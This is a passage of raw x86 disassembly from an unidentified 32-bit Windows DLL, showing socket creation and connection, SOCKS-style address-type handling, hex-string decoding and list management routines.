1000172a:	75 03                	jne    0x1000172f
1000172c:	89 41 38             	mov    %eax,0x38(%ecx)
1000172f:	e8 4f 00 00 00       	call   0x10001783
10001734:	5d                   	pop    %ebp
10001735:	c2 10 00             	ret    $0x10
10001738:	55                   	push   %ebp
10001739:	8b ec                	mov    %esp,%ebp
1000173b:	81 ec 00 01 00 00    	sub    $0x100,%esp
10001741:	56                   	push   %esi
10001742:	8b 75 08             	mov    0x8(%ebp),%esi
10001745:	85 f6                	test   %esi,%esi
10001747:	74 35                	je     0x1000177e
10001749:	83 66 3c 00          	andl   $0x0,0x3c(%esi)
1000174d:	83 7e 44 00          	cmpl   $0x0,0x44(%esi)
10001751:	74 2b                	je     0x1000177e
10001753:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
10001757:	50                   	push   %eax
10001758:	ff 75 0c             	pushl  0xc(%ebp)
1000175b:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10001761:	68 c4 e2 00 10       	push   $0x1000e2c4
10001766:	50                   	push   %eax
10001767:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000176d:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10001773:	50                   	push   %eax
10001774:	ff 76 48             	pushl  0x48(%esi)
10001777:	56                   	push   %esi
10001778:	ff 56 44             	call   *0x44(%esi)
1000177b:	83 c4 1c             	add    $0x1c,%esp
1000177e:	5e                   	pop    %esi
1000177f:	c9                   	leave  
10001780:	c2 0c 00             	ret    $0xc
10001783:	55                   	push   %ebp
10001784:	8b ec                	mov    %esp,%ebp
10001786:	83 e4 f8             	and    $0xfffffff8,%esp
10001789:	81 ec 14 01 00 00    	sub    $0x114,%esp
1000178f:	83 64 24 04 00       	andl   $0x0,0x4(%esp)
10001794:	53                   	push   %ebx
10001795:	56                   	push   %esi
10001796:	57                   	push   %edi
10001797:	8b f9                	mov    %ecx,%edi
10001799:	8b 47 40             	mov    0x40(%edi),%eax
1000179c:	85 c0                	test   %eax,%eax
1000179e:	74 07                	je     0x100017a7
100017a0:	50                   	push   %eax
100017a1:	e8 ce fe ff ff       	call   0x10001674
100017a6:	59                   	pop    %ecx
100017a7:	8b c7                	mov    %edi,%eax
100017a9:	e8 2b 01 00 00       	call   0x100018d9
100017ae:	85 c0                	test   %eax,%eax
100017b0:	75 07                	jne    0x100017b9
100017b2:	33 c0                	xor    %eax,%eax
100017b4:	e9 8c 00 00 00       	jmp    0x10001845
100017b9:	ff 77 04             	pushl  0x4(%edi)
100017bc:	8b 4f 38             	mov    0x38(%edi),%ecx
100017bf:	8b 07                	mov    (%edi),%eax
100017c1:	8d 5c 24 18          	lea    0x18(%esp),%ebx
100017c5:	e8 2e 6d 00 00       	call   0x100084f8
100017ca:	59                   	pop    %ecx
100017cb:	85 c0                	test   %eax,%eax
100017cd:	74 e3                	je     0x100017b2
100017cf:	ff 74 24 14          	pushl  0x14(%esp)
100017d3:	8d 44 24 24          	lea    0x24(%esp),%eax
100017d7:	50                   	push   %eax
100017d8:	ff 15 58 e1 00 10    	call   *0x1000e158
100017de:	8d 74 24 20          	lea    0x20(%esp),%esi
100017e2:	e8 74 3c 00 00       	call   0x1000545b
100017e7:	8b 44 24 14          	mov    0x14(%esp),%eax
100017eb:	68 ac 26 00 00       	push   $0x26ac
100017f0:	e8 ab 3c 00 00       	call   0x100054a0
100017f5:	8b 4c 24 20          	mov    0x20(%esp),%ecx
100017f9:	57                   	push   %edi
100017fa:	57                   	push   %edi
100017fb:	51                   	push   %ecx
100017fc:	ff 74 24 28          	pushl  0x28(%esp)
10001800:	0f b7 c0             	movzwl %ax,%eax
10001803:	8d 4f 10             	lea    0x10(%edi),%ecx
10001806:	51                   	push   %ecx
10001807:	50                   	push   %eax
10001808:	8b c6                	mov    %esi,%eax
1000180a:	50                   	push   %eax
1000180b:	e8 9d fd ff ff       	call   0x100015ad
10001810:	83 c4 20             	add    $0x20,%esp
10001813:	89 47 40             	mov    %eax,0x40(%edi)
10001816:	85 c0                	test   %eax,%eax
10001818:	74 0c                	je     0x10001826
1000181a:	33 c0                	xor    %eax,%eax
1000181c:	40                   	inc    %eax
1000181d:	89 47 0c             	mov    %eax,0xc(%edi)
10001820:	89 44 24 10          	mov    %eax,0x10(%esp)
10001824:	eb 07                	jmp    0x1000182d
10001826:	ff 47 38             	incl   0x38(%edi)
10001829:	83 67 3c 00          	andl   $0x0,0x3c(%edi)
1000182d:	ff 74 24 14          	pushl  0x14(%esp)
10001831:	e8 dd 51 00 00       	call   0x10006a13
10001836:	ff 74 24 1c          	pushl  0x1c(%esp)
1000183a:	e8 d4 51 00 00       	call   0x10006a13
1000183f:	8b 44 24 18          	mov    0x18(%esp),%eax
10001843:	59                   	pop    %ecx
10001844:	59                   	pop    %ecx
10001845:	5f                   	pop    %edi
10001846:	5e                   	pop    %esi
10001847:	5b                   	pop    %ebx
10001848:	8b e5                	mov    %ebp,%esp
1000184a:	5d                   	pop    %ebp
1000184b:	c3                   	ret    
1000184c:	33 c0                	xor    %eax,%eax
1000184e:	40                   	inc    %eax
1000184f:	39 41 0c             	cmp    %eax,0xc(%ecx)
10001852:	74 05                	je     0x10001859
10001854:	e9 2a ff ff ff       	jmp    0x10001783
10001859:	c3                   	ret    
1000185a:	55                   	push   %ebp
1000185b:	8b ec                	mov    %esp,%ebp
1000185d:	51                   	push   %ecx
1000185e:	51                   	push   %ecx
1000185f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10001863:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
10001867:	56                   	push   %esi
10001868:	8b 77 30             	mov    0x30(%edi),%esi
1000186b:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000186e:	50                   	push   %eax
1000186f:	ff 75 08             	pushl  0x8(%ebp)
10001872:	8d 45 fc             	lea    -0x4(%ebp),%eax
10001875:	e8 1a 63 00 00       	call   0x10007b94
1000187a:	85 c0                	test   %eax,%eax
1000187c:	74 54                	je     0x100018d2
1000187e:	8b 45 fc             	mov    -0x4(%ebp),%eax
10001881:	83 65 08 00          	andl   $0x0,0x8(%ebp)
10001885:	8d 77 08             	lea    0x8(%edi),%esi
10001888:	56                   	push   %esi
10001889:	ff 75 f8             	pushl  -0x8(%ebp)
1000188c:	8d 55 08             	lea    0x8(%ebp),%edx
1000188f:	e8 41 6c 00 00       	call   0x100084d5
10001894:	59                   	pop    %ecx
10001895:	59                   	pop    %ecx
10001896:	85 c0                	test   %eax,%eax
10001898:	74 2f                	je     0x100018c9
1000189a:	83 3e 00             	cmpl   $0x0,(%esi)
1000189d:	74 2a                	je     0x100018c9
1000189f:	e8 7a 3c 00 00       	call   0x1000551e
100018a4:	3b 45 08             	cmp    0x8(%ebp),%eax
100018a7:	77 20                	ja     0x100018c9
100018a9:	ff 75 f8             	pushl  -0x8(%ebp)
100018ac:	8b f7                	mov    %edi,%esi
100018ae:	ff 75 fc             	pushl  -0x4(%ebp)
100018b1:	e8 08 fe ff ff       	call   0x100016be
100018b6:	8b f0                	mov    %eax,%esi
100018b8:	85 f6                	test   %esi,%esi
100018ba:	75 09                	jne    0x100018c5
100018bc:	ff 75 fc             	pushl  -0x4(%ebp)
100018bf:	e8 4f 51 00 00       	call   0x10006a13
100018c4:	59                   	pop    %ecx
100018c5:	8b c6                	mov    %esi,%eax
100018c7:	eb 0b                	jmp    0x100018d4
100018c9:	ff 75 fc             	pushl  -0x4(%ebp)
100018cc:	e8 42 51 00 00       	call   0x10006a13
100018d1:	59                   	pop    %ecx
100018d2:	33 c0                	xor    %eax,%eax
100018d4:	5e                   	pop    %esi
100018d5:	c9                   	leave  
100018d6:	c2 04 00             	ret    $0x4
100018d9:	55                   	push   %ebp
100018da:	8b ec                	mov    %esp,%ebp
100018dc:	81 ec 00 01 00 00    	sub    $0x100,%esp
100018e2:	56                   	push   %esi
100018e3:	8b f0                	mov    %eax,%esi
100018e5:	68 00 01 00 00       	push   $0x100
100018ea:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
100018f0:	50                   	push   %eax
100018f1:	8b 46 30             	mov    0x30(%esi),%eax
100018f4:	e8 81 5a 00 00       	call   0x1000737a
100018f9:	85 c0                	test   %eax,%eax
100018fb:	74 16                	je     0x10001913
100018fd:	83 c6 10             	add    $0x10,%esi
10001900:	56                   	push   %esi
10001901:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
10001907:	e8 0a 00 00 00       	call   0x10001916
1000190c:	f7 d8                	neg    %eax
1000190e:	1b c0                	sbb    %eax,%eax
10001910:	59                   	pop    %ecx
10001911:	f7 d8                	neg    %eax
10001913:	5e                   	pop    %esi
10001914:	c9                   	leave  
10001915:	c3                   	ret    
10001916:	55                   	push   %ebp
10001917:	8b ec                	mov    %esp,%ebp
10001919:	53                   	push   %ebx
1000191a:	56                   	push   %esi
1000191b:	8b f0                	mov    %eax,%esi
1000191d:	33 db                	xor    %ebx,%ebx
1000191f:	eb 05                	jmp    0x10001926
10001921:	3a c3                	cmp    %bl,%al
10001923:	74 0b                	je     0x10001930
10001925:	46                   	inc    %esi
10001926:	8a 06                	mov    (%esi),%al
10001928:	3c 2e                	cmp    $0x2e,%al
1000192a:	75 f5                	jne    0x10001921
1000192c:	3a c3                	cmp    %bl,%al
1000192e:	75 04                	jne    0x10001934
10001930:	33 c0                	xor    %eax,%eax
10001932:	eb 61                	jmp    0x10001995
10001934:	46                   	inc    %esi
10001935:	56                   	push   %esi
10001936:	ff 15 34 e1 00 10    	call   *0x1000e134
1000193c:	8b c8                	mov    %eax,%ecx
1000193e:	81 e1 01 00 00 80    	and    $0x80000001,%ecx
10001944:	79 05                	jns    0x1000194b
10001946:	49                   	dec    %ecx
10001947:	83 c9 fe             	or     $0xfffffffe,%ecx
1000194a:	41                   	inc    %ecx
1000194b:	83 f9 01             	cmp    $0x1,%ecx
1000194e:	75 05                	jne    0x10001955
10001950:	83 f8 08             	cmp    $0x8,%eax
10001953:	7c db                	jl     0x10001930
10001955:	99                   	cltd   
10001956:	2b c2                	sub    %edx,%eax
10001958:	57                   	push   %edi
10001959:	8b f8                	mov    %eax,%edi
1000195b:	d1 ff                	sar    %edi
1000195d:	83 ff 20             	cmp    $0x20,%edi
10001960:	77 37                	ja     0x10001999
10001962:	6a 20                	push   $0x20
10001964:	53                   	push   %ebx
10001965:	ff 75 08             	pushl  0x8(%ebp)
10001968:	e8 bd c3 00 00       	call   0x1000dd2a
1000196d:	83 c4 0c             	add    $0xc,%esp
10001970:	3b fb                	cmp    %ebx,%edi
10001972:	7e 1d                	jle    0x10001991
10001974:	8a 56 01             	mov    0x1(%esi),%dl
10001977:	8a 06                	mov    (%esi),%al
10001979:	e8 6f 3a 00 00       	call   0x100053ed
1000197e:	83 f8 ff             	cmp    $0xffffffff,%eax
10001981:	74 16                	je     0x10001999
10001983:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001986:	83 c6 02             	add    $0x2,%esi
10001989:	88 04 0b             	mov    %al,(%ebx,%ecx,1)
1000198c:	43                   	inc    %ebx
1000198d:	3b df                	cmp    %edi,%ebx
1000198f:	7c e3                	jl     0x10001974
10001991:	33 c0                	xor    %eax,%eax
10001993:	40                   	inc    %eax
10001994:	5f                   	pop    %edi
10001995:	5e                   	pop    %esi
10001996:	5b                   	pop    %ebx
10001997:	5d                   	pop    %ebp
10001998:	c3                   	ret    
10001999:	33 c0                	xor    %eax,%eax
1000199b:	eb f7                	jmp    0x10001994
1000199d:	c7 40 44 61 ce 00 10 	movl   $0x1000ce61,0x44(%eax)
100019a4:	89 48 48             	mov    %ecx,0x48(%eax)
100019a7:	33 c0                	xor    %eax,%eax
100019a9:	40                   	inc    %eax
100019aa:	c3                   	ret    
100019ab:	55                   	push   %ebp
100019ac:	8b ec                	mov    %esp,%ebp
100019ae:	51                   	push   %ecx
100019af:	56                   	push   %esi
100019b0:	8b f2                	mov    %edx,%esi
100019b2:	83 4e 2c ff          	orl    $0xffffffff,0x2c(%esi)
100019b6:	80 78 01 01          	cmpb   $0x1,0x1(%eax)
100019ba:	57                   	push   %edi
100019bb:	8b f9                	mov    %ecx,%edi
100019bd:	75 0b                	jne    0x100019ca
100019bf:	ff 75 08             	pushl  0x8(%ebp)
100019c2:	e8 0e 00 00 00       	call   0x100019d5
100019c7:	59                   	pop    %ecx
100019c8:	eb 06                	jmp    0x100019d0
100019ca:	c6 47 01 07          	movb   $0x7,0x1(%edi)
100019ce:	33 c0                	xor    %eax,%eax
100019d0:	5f                   	pop    %edi
100019d1:	5e                   	pop    %esi
100019d2:	59                   	pop    %ecx
100019d3:	5d                   	pop    %ebp
100019d4:	c3                   	ret    
100019d5:	55                   	push   %ebp
100019d6:	8b ec                	mov    %esp,%ebp
100019d8:	81 ec 28 01 00 00    	sub    $0x128,%esp
100019de:	53                   	push   %ebx
100019df:	8b d8                	mov    %eax,%ebx
100019e1:	8b 45 08             	mov    0x8(%ebp),%eax
100019e4:	ff 30                	pushl  (%eax)
100019e6:	53                   	push   %ebx
100019e7:	57                   	push   %edi
100019e8:	e8 23 c3 00 00       	call   0x1000dd10
100019ed:	8a 43 03             	mov    0x3(%ebx),%al
100019f0:	83 c4 0c             	add    $0xc,%esp
100019f3:	3c 01                	cmp    $0x1,%al
100019f5:	0f 85 b9 00 00 00    	jne    0x10001ab4
100019fb:	6a 06                	push   $0x6
100019fd:	6a 01                	push   $0x1
100019ff:	6a 02                	push   $0x2
10001a01:	ff 15 48 e2 00 10    	call   *0x1000e248
10001a07:	89 46 2c             	mov    %eax,0x2c(%esi)
10001a0a:	83 f8 ff             	cmp    $0xffffffff,%eax
10001a0d:	75 09                	jne    0x10001a18
10001a0f:	c6 47 01 01          	movb   $0x1,0x1(%edi)
10001a13:	e9 96 01 00 00       	jmp    0x10001bae
10001a18:	68 80 00 00 00       	push   $0x80
10001a1d:	8d 46 58             	lea    0x58(%esi),%eax
10001a20:	6a 00                	push   $0x0
10001a22:	50                   	push   %eax
10001a23:	e8 02 c3 00 00       	call   0x1000dd2a
10001a28:	83 c4 0c             	add    $0xc,%esp
10001a2b:	6a 02                	push   $0x2
10001a2d:	59                   	pop    %ecx
10001a2e:	8d 46 58             	lea    0x58(%esi),%eax
10001a31:	66 89 08             	mov    %cx,(%eax)
10001a34:	8b 4b 04             	mov    0x4(%ebx),%ecx
10001a37:	89 4e 5c             	mov    %ecx,0x5c(%esi)
10001a3a:	66 8b 4b 08          	mov    0x8(%ebx),%cx
10001a3e:	66 89 4e 5a          	mov    %cx,0x5a(%esi)
10001a42:	33 c9                	xor    %ecx,%ecx
10001a44:	51                   	push   %ecx
10001a45:	51                   	push   %ecx
10001a46:	51                   	push   %ecx
10001a47:	51                   	push   %ecx
10001a48:	6a 10                	push   $0x10
10001a4a:	5b                   	pop    %ebx
10001a4b:	53                   	push   %ebx
10001a4c:	50                   	push   %eax
10001a4d:	ff 76 2c             	pushl  0x2c(%esi)
10001a50:	ff 15 68 e2 00 10    	call   *0x1000e268
10001a56:	83 f8 ff             	cmp    $0xffffffff,%eax
10001a59:	75 16                	jne    0x10001a71
10001a5b:	ff 76 2c             	pushl  0x2c(%esi)
10001a5e:	ff 15 84 e2 00 10    	call   *0x1000e284
10001a64:	83 66 2c 00          	andl   $0x0,0x2c(%esi)
10001a68:	c6 47 01 04          	movb   $0x4,0x1(%edi)
10001a6c:	e9 3d 01 00 00       	jmp    0x10001bae
10001a71:	33 c0                	xor    %eax,%eax
10001a73:	c6 47 01 00          	movb   $0x0,0x1(%edi)
10001a77:	c7 46 54 01 00 00 00 	movl   $0x1,0x54(%esi)
10001a7e:	83 67 04 00          	andl   $0x0,0x4(%edi)
10001a82:	66 89 47 08          	mov    %ax,0x8(%edi)
10001a86:	8d 45 f8             	lea    -0x8(%ebp),%eax
10001a89:	50                   	push   %eax
10001a8a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10001a8d:	50                   	push   %eax
10001a8e:	c6 47 03 01          	movb   $0x1,0x3(%edi)
10001a92:	ff 76 2c             	pushl  0x2c(%esi)
10001a95:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10001a98:	ff 15 44 e2 00 10    	call   *0x1000e244
10001a9e:	83 f8 ff             	cmp    $0xffffffff,%eax
10001aa1:	0f 84 07 01 00 00    	je     0x10001bae
10001aa7:	66 8b 45 e6          	mov    -0x1a(%ebp),%ax
10001aab:	66 89 47 08          	mov    %ax,0x8(%edi)
10001aaf:	e9 fa 00 00 00       	jmp    0x10001bae
10001ab4:	3c 03                	cmp    $0x3,%al
10001ab6:	0f 85 e3 00 00 00    	jne    0x10001b9f
10001abc:	6a 06                	push   $0x6
10001abe:	6a 01                	push   $0x1
10001ac0:	6a 02                	push   $0x2
10001ac2:	ff 15 48 e2 00 10    	call   *0x1000e248
10001ac8:	89 46 2c             	mov    %eax,0x2c(%esi)
10001acb:	83 f8 ff             	cmp    $0xffffffff,%eax
10001ace:	0f 84 3b ff ff ff    	je     0x10001a0f
10001ad4:	68 80 00 00 00       	push   $0x80
10001ad9:	8d 46 58             	lea    0x58(%esi),%eax
10001adc:	6a 00                	push   $0x0
10001ade:	50                   	push   %eax
10001adf:	e8 46 c2 00 00       	call   0x1000dd2a
10001ae4:	83 c4 0c             	add    $0xc,%esp
10001ae7:	68 04 01 00 00       	push   $0x104
10001aec:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001af2:	6a 00                	push   $0x0
10001af4:	50                   	push   %eax
10001af5:	e8 30 c2 00 00       	call   0x1000dd2a
10001afa:	0f b6 43 04          	movzbl 0x4(%ebx),%eax
10001afe:	83 c4 0c             	add    $0xc,%esp
10001b01:	50                   	push   %eax
10001b02:	89 45 f8             	mov    %eax,-0x8(%ebp)
10001b05:	8d 43 05             	lea    0x5(%ebx),%eax
10001b08:	50                   	push   %eax
10001b09:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001b0f:	50                   	push   %eax
10001b10:	e8 fb c1 00 00       	call   0x1000dd10
10001b15:	8d 85 dc fe ff ff    	lea    -0x124(%ebp),%eax
10001b1b:	83 c4 0c             	add    $0xc,%esp
10001b1e:	50                   	push   %eax
10001b1f:	e8 b6 3e 00 00       	call   0x100059da
10001b24:	59                   	pop    %ecx
10001b25:	6a 02                	push   $0x2
10001b27:	5a                   	pop    %edx
10001b28:	89 46 5c             	mov    %eax,0x5c(%esi)
10001b2b:	8b 45 f8             	mov    -0x8(%ebp),%eax
10001b2e:	8d 4e 58             	lea    0x58(%esi),%ecx
10001b31:	66 89 11             	mov    %dx,(%ecx)
10001b34:	66 8b 44 18 05       	mov    0x5(%eax,%ebx,1),%ax
10001b39:	66 89 46 5a          	mov    %ax,0x5a(%esi)
10001b3d:	33 c0                	xor    %eax,%eax
10001b3f:	50                   	push   %eax
10001b40:	50                   	push   %eax
10001b41:	50                   	push   %eax
10001b42:	50                   	push   %eax
10001b43:	6a 10                	push   $0x10
10001b45:	5b                   	pop    %ebx
10001b46:	53                   	push   %ebx
10001b47:	51                   	push   %ecx
10001b48:	ff 76 2c             	pushl  0x2c(%esi)
10001b4b:	ff 15 68 e2 00 10    	call   *0x1000e268
10001b51:	83 f8 ff             	cmp    $0xffffffff,%eax
10001b54:	0f 84 01 ff ff ff    	je     0x10001a5b
10001b5a:	33 c0                	xor    %eax,%eax
10001b5c:	c6 47 01 00          	movb   $0x0,0x1(%edi)
10001b60:	c7 46 54 01 00 00 00 	movl   $0x1,0x54(%esi)
10001b67:	83 67 04 00          	andl   $0x0,0x4(%edi)
10001b6b:	66 89 47 08          	mov    %ax,0x8(%edi)
10001b6f:	8d 45 f4             	lea    -0xc(%ebp),%eax
10001b72:	50                   	push   %eax
10001b73:	8d 45 e4             	lea    -0x1c(%ebp),%eax
10001b76:	50                   	push   %eax
10001b77:	c6 47 03 01          	movb   $0x1,0x3(%edi)
10001b7b:	ff 76 2c             	pushl  0x2c(%esi)
10001b7e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10001b81:	ff 15 44 e2 00 10    	call   *0x1000e244
10001b87:	83 f8 ff             	cmp    $0xffffffff,%eax
10001b8a:	74 08                	je     0x10001b94
10001b8c:	66 8b 45 e6          	mov    -0x1a(%ebp),%ax
10001b90:	66 89 47 08          	mov    %ax,0x8(%edi)
10001b94:	8b 45 08             	mov    0x8(%ebp),%eax
10001b97:	c7 00 0a 00 00 00    	movl   $0xa,(%eax)
10001b9d:	eb 0f                	jmp    0x10001bae
10001b9f:	3c 04                	cmp    $0x4,%al
10001ba1:	75 0b                	jne    0x10001bae
10001ba3:	c6 47 01 08          	movb   $0x8,0x1(%edi)
10001ba7:	c7 46 54 01 00 00 00 	movl   $0x1,0x54(%esi)
10001bae:	33 c0                	xor    %eax,%eax
10001bb0:	5b                   	pop    %ebx
10001bb1:	c9                   	leave  
10001bb2:	c3                   	ret    
10001bb3:	56                   	push   %esi
10001bb4:	8b f0                	mov    %eax,%esi
10001bb6:	e8 0b 87 00 00       	call   0x1000a2c6
10001bbb:	8d 46 18             	lea    0x18(%esi),%eax
10001bbe:	50                   	push   %eax
10001bbf:	c7 06 cc e2 00 10    	movl   $0x1000e2cc,(%esi)
10001bc5:	ff 15 5c e1 00 10    	call   *0x1000e15c
10001bcb:	8b c6                	mov    %esi,%eax
10001bcd:	5e                   	pop    %esi
10001bce:	c3                   	ret    
10001bcf:	55                   	push   %ebp
10001bd0:	8b ec                	mov    %esp,%ebp
10001bd2:	56                   	push   %esi
10001bd3:	8b f1                	mov    %ecx,%esi
10001bd5:	e8 14 00 00 00       	call   0x10001bee
10001bda:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
10001bde:	74 07                	je     0x10001be7
10001be0:	56                   	push   %esi
10001be1:	e8 67 60 00 00       	call   0x10007c4d
10001be6:	59                   	pop    %ecx
10001be7:	8b c6                	mov    %esi,%eax
10001be9:	5e                   	pop    %esi
10001bea:	5d                   	pop    %ebp
10001beb:	c2 04 00             	ret    $0x4
10001bee:	56                   	push   %esi
10001bef:	8b f1                	mov    %ecx,%esi
10001bf1:	8b c6                	mov    %esi,%eax
10001bf3:	c7 06 cc e2 00 10    	movl   $0x1000e2cc,(%esi)
10001bf9:	e8 98 87 00 00       	call   0x1000a396
10001bfe:	8d 46 18             	lea    0x18(%esi),%eax
10001c01:	50                   	push   %eax
10001c02:	ff 15 68 e1 00 10    	call   *0x1000e168
10001c08:	8b ce                	mov    %esi,%ecx
10001c0a:	5e                   	pop    %esi
10001c0b:	e9 fa 86 00 00       	jmp    0x1000a30a
10001c10:	55                   	push   %ebp
10001c11:	8b ec                	mov    %esp,%ebp
10001c13:	8b 45 08             	mov    0x8(%ebp),%eax
10001c16:	56                   	push   %esi
10001c17:	33 f6                	xor    %esi,%esi
10001c19:	e8 3d 01 00 00       	call   0x10001d5b
10001c1e:	85 c0                	test   %eax,%eax
10001c20:	74 2d                	je     0x10001c4f
10001c22:	6a 10                	push   $0x10
10001c24:	e8 bb 4d 00 00       	call   0x100069e4
10001c29:	59                   	pop    %ecx
10001c2a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10001c2d:	89 08                	mov    %ecx,(%eax)
10001c2f:	8b 4d 10             	mov    0x10(%ebp),%ecx
10001c32:	89 48 04             	mov    %ecx,0x4(%eax)
10001c35:	8b 4d 14             	mov    0x14(%ebp),%ecx
10001c38:	89 48 08             	mov    %ecx,0x8(%eax)
10001c3b:	8b 4d 08             	mov    0x8(%ebp),%ecx
10001c3e:	50                   	push   %eax
10001c3f:	e8 e0 86 00 00       	call   0x1000a324
10001c44:	0f b6 f0             	movzbl %al,%esi
10001c47:	8b 45 08             	mov    0x8(%ebp),%eax
10001c4a:	e8 1a 01 00 00       	call   0x10001d69
10001c4f:	8b c6                	mov    %esi,%eax
10001c51:	5e                   	pop    %esi
10001c52:	5d                   	pop    %ebp
10001c53:	c2 10 00             	ret    $0x10
10001c56:	55                   	push   %ebp
10001c57:	8b ec                	mov    %esp,%ebp
10001c59:	56                   	push   %esi
10001c5a:	57                   	push   %edi
10001c5b:	8b c1                	mov    %ecx,%eax
10001c5d:	e8 3c 87 00 00       	call   0x1000a39e
10001c62:	8b f0                	mov    %eax,%esi
10001c64:	33 d2                	xor    %edx,%edx
10001c66:	85 f6                	test   %esi,%esi
10001c68:	74 1c                	je     0x10001c86
10001c6a:	52                   	push   %edx
10001c6b:	e8 ea 86 00 00       	call   0x1000a35a
10001c70:	8b 00                	mov    (%eax),%eax
10001c72:	8b 38                	mov    (%eax),%edi
10001c74:	3b 7d 08             	cmp    0x8(%ebp),%edi
10001c77:	75 08                	jne    0x10001c81
10001c79:	8b 78 04             	mov    0x4(%eax),%edi
10001c7c:	3b 7d 0c             	cmp    0xc(%ebp),%edi
10001c7f:	74 0d                	je     0x10001c8e
10001c81:	42                   	inc    %edx
10001c82:	3b d6                	cmp    %esi,%edx
10001c84:	72 e4                	jb     0x10001c6a
10001c86:	33 c0                	xor    %eax,%eax
10001c88:	5f                   	pop    %edi
10001c89:	5e                   	pop    %esi
10001c8a:	5d                   	pop    %ebp
10001c8b:	c2 08 00             	ret    $0x8
10001c8e:	8b 40 08             	mov    0x8(%eax),%eax
10001c91:	eb f5                	jmp    0x10001c88
10001c93:	55                   	push   %ebp
10001c94:	8b ec                	mov    %esp,%ebp
10001c96:	53                   	push   %ebx
10001c97:	8b c6                	mov    %esi,%eax
10001c99:	33 db                	xor    %ebx,%ebx
10001c9b:	e8 bb 00 00 00       	call   0x10001d5b
10001ca0:	85 c0                	test   %eax,%eax
10001ca2:	74 3b                	je     0x10001cdf
10001ca4:	57                   	push   %edi
10001ca5:	8b c6                	mov    %esi,%eax
10001ca7:	e8 f2 86 00 00       	call   0x1000a39e
10001cac:	8b f8                	mov    %eax,%edi
10001cae:	33 d2                	xor    %edx,%edx
10001cb0:	85 ff                	test   %edi,%edi
10001cb2:	74 23                	je     0x10001cd7
10001cb4:	52                   	push   %edx
10001cb5:	8b ce                	mov    %esi,%ecx
10001cb7:	e8 9e 86 00 00       	call   0x1000a35a
10001cbc:	8b 00                	mov    (%eax),%eax
10001cbe:	8b 08                	mov    (%eax),%ecx
10001cc0:	3b 4d 08             	cmp    0x8(%ebp),%ecx
10001cc3:	75 08                	jne    0x10001ccd
10001cc5:	8b 40 04             	mov    0x4(%eax),%eax
10001cc8:	3b 45 0c             	cmp    0xc(%ebp),%eax
10001ccb:	74 07                	je     0x10001cd4
10001ccd:	42                   	inc    %edx
10001cce:	3b d7                	cmp    %edi,%edx
10001cd0:	72 e2                	jb     0x10001cb4
10001cd2:	eb 03                	jmp    0x10001cd7
10001cd4:	33 db                	xor    %ebx,%ebx
10001cd6:	43                   	inc    %ebx
10001cd7:	8b c6                	mov    %esi,%eax
10001cd9:	e8 8b 00 00 00       	call   0x10001d69
10001cde:	5f                   	pop    %edi
10001cdf:	8b c3                	mov    %ebx,%eax
10001ce1:	5b                   	pop    %ebx
10001ce2:	5d                   	pop    %ebp
10001ce3:	c2 08 00             	ret    $0x8
10001ce6:	55                   	push   %ebp
10001ce7:	8b ec                	mov    %esp,%ebp
10001ce9:	8b c1                	mov    %ecx,%eax
10001ceb:	e8 ae 86 00 00       	call   0x1000a39e
10001cf0:	39 45 08             	cmp    %eax,0x8(%ebp)
10001cf3:	72 04                	jb     0x10001cf9
10001cf5:	33 c0                	xor    %eax,%eax
10001cf7:	eb 0d                	jmp    0x10001d06
10001cf9:	ff 75 08             	pushl  0x8(%ebp)
10001cfc:	e8 59 86 00 00       	call   0x1000a35a
10001d01:	8b 00                	mov    (%eax),%eax
10001d03:	8b 40 08             	mov    0x8(%eax),%eax
10001d06:	5d                   	pop    %ebp
10001d07:	c2 04 00             	ret    $0x4
10001d0a:	55                   	push   %ebp
10001d0b:	8b ec                	mov    %esp,%ebp
10001d0d:	8b c6                	mov    %esi,%eax
10001d0f:	e8 47 00 00 00       	call   0x10001d5b
10001d14:	85 c0                	test   %eax,%eax
10001d16:	74 3f                	je     0x10001d57
10001d18:	57                   	push   %edi
10001d19:	8b c6                	mov    %esi,%eax
10001d1b:	e8 7e 86 00 00       	call   0x1000a39e
10001d20:	8b f8                	mov    %eax,%edi
10001d22:	33 d2                	xor    %edx,%edx
10001d24:	85 ff                	test   %edi,%edi
10001d26:	74 27                	je     0x10001d4f
10001d28:	52                   	push   %edx
10001d29:	8b ce                	mov    %esi,%ecx
10001d2b:	e8 2a 86 00 00       	call   0x1000a35a
10001d30:	8b 00                	mov    (%eax),%eax
10001d32:	8b 08                	mov    (%eax),%ecx
10001d34:	3b 4d 08             	cmp    0x8(%ebp),%ecx
10001d37:	75 08                	jne    0x10001d41
10001d39:	8b 40 04             	mov    0x4(%eax),%eax
10001d3c:	3b 45 0c             	cmp    0xc(%ebp),%eax
10001d3f:	74 07                	je     0x10001d48
10001d41:	42                   	inc    %edx
10001d42:	3b d7                	cmp    %edi,%edx
10001d44:	72 e2                	jb     0x10001d28
10001d46:	eb 07                	jmp    0x10001d4f
10001d48:	8b c6                	mov    %esi,%eax
10001d4a:	e8 3c 86 00 00       	call   0x1000a38b
10001d4f:	8b c6                	mov    %esi,%eax
10001d51:	e8 13 00 00 00       	call   0x10001d69
10001d56:	5f                   	pop    %edi
10001d57:	5d                   	pop    %ebp
10001d58:	c2 08 00             	ret    $0x8
10001d5b:	83 c0 18             	add    $0x18,%eax
10001d5e:	50                   	push   %eax
10001d5f:	ff 15 64 e1 00 10    	call   *0x1000e164
10001d65:	33 c0                	xor    %eax,%eax
10001d67:	40                   	inc    %eax
10001d68:	c3                   	ret    
10001d69:	83 c0 18             	add    $0x18,%eax
10001d6c:	50                   	push   %eax
10001d6d:	ff 15 60 e1 00 10    	call   *0x1000e160
10001d73:	c3                   	ret    
10001d74:	55                   	push   %ebp
